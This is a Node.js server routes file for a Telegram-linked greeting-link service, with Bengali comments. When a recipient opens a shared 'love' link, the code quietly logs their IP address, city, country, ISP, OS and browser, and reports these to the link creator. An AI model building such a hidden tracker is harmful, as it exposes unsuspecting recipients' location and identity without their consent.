const path = require('path');
const https = require('https');
const { Markup } = require('telegraf');
const { parseUserAgent } = require('./visitor');
const { CATEGORY_CONFIGS } = require('./category');

function setupRoutes(app, db, saveDB, bot) {
    app.post('/api/get-content', async (req, res) => {
        try {
            const linkId = req.body.id;
            const data = db.linkDatabase[linkId];
            if (!data) return res.json({ success: false });
            
            // ২-১. লিংক খোলার সাথে সাথেই স্থায়ী নোটিফিকেশন পাঠানো
            bot.telegram.sendMessage(data.userId, `আপনার লিংক ওপেন করা হয়েছে! (লিংক আইডি: ${linkId})`).catch(() => {});
            
            let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
            let ip = rawIp.split(',')[0].trim();
            if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
            
            const userAgent = req.headers['user-agent'] || "";
            const { os, browser } = parseUserAgent(userAgent);
            const currentTimeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
            
            let visitorObj = {
                time: currentTimeString, ip: ip, country: "Unknown", city: "Unknown", isp: "Unknown", os: os, browser: browser
            };
            
            if (ip && ip !== "127.0.0.1" && ip !== "::1") {
                https.get(`https://ip-api.com/json/${ip}`, (apiRes) => {
                    let body = "";
                    apiRes.on('data', chunk => body += chunk);
                    apiRes.on('end', () => {
                        try {
                            const ipData = JSON.parse(body);
                            if (ipData.status === "success") {
                                visitorObj.country = ipData.country || "Unknown";
                                visitorObj.city = ipData.city || "Unknown";
                                visitorObj.isp = ipData.isp || "Unknown";
                            }
                        } catch (e) {}
                        if (!data.visitors) data.visitors = [];
                        data.visitors.push(visitorObj);
                        saveDB();
                    });
                }).on('error', () => {
                    if (!data.visitors) data.visitors = [];
                    data.visitors.push(visitorObj);
                    saveDB();
                });
            } else {
                if (!data.visitors) data.visitors = [];
                data.visitors.push(visitorObj);
                await saveDB();
            }
            
            if (data.countdown && new Date(data.countdown) > new Date()) {
                return res.json({ success: true, isLocked: true, countdownTime: data.countdown });
            }
            
            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
            return res.json({ 
                success: true, isLocked: false, title: config.title, music: data.music, 
                animations: data.animations, letter: data.letter, emojis: config.emojis, 
                question: config.question, buttons: config.buttons, image: data.image || null 
            });
        } catch (err) { 
            res.json({ success: false }); 
        }
    });

    // ২-২. খাম খোলার নোটিফিকেশন রাউট
    app.post('/api/open-envelope', async (req, res) => {
        try {
            const { id } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });

            bot.telegram.sendMessage(data.userId, `খাম খোলা হয়েছে! (লিংক আইডি: ${id})`).catch(() => {});
            return res.json({ success: true });
        } catch (err) {
            res.json({ success: false });
        }
    });

    // ২-৩. ইয়েস/নো রিপ্লাই নোটিফিকেশন (লিংক অফ বাটন ছাড়া)
    app.post('/api/submit-answer', async (req, res) => {
        try {
            const { id, answer } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });
            
            data.answer = answer;
            await saveDB();
            
            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
            bot.telegram.sendMessage(data.userId, `একটি রিপ্লাই এসেছে! (লিংক আইডি: ${id})\nQuestion: ${config.question}\nAns: ${answer}`).catch(() => {});
            
            return res.json({ success: true });
        } catch (err) { 
            res.json({ success: false }); 
        }
    });

    // ২-৪. ভিজিটরের টেক্সট মেসেজ নোটিফিকেশন
    app.post('/api/submit-message', async (req, res) => {
        try {
            const { id, message } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });

            data.message = message;
            await saveDB();

            bot.telegram.sendMessage(data.userId, `একটি মেসেজ এসেছে! (লিংক আইডি: ${id})\nমেসেজ: ${message}`).catch(() => {});

            return res.json({ success: true });
        } catch (err) {
            res.json({ success: false });
        }
    });

    app.get('/love/:id', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
}

module.exports = { setupRoutes };
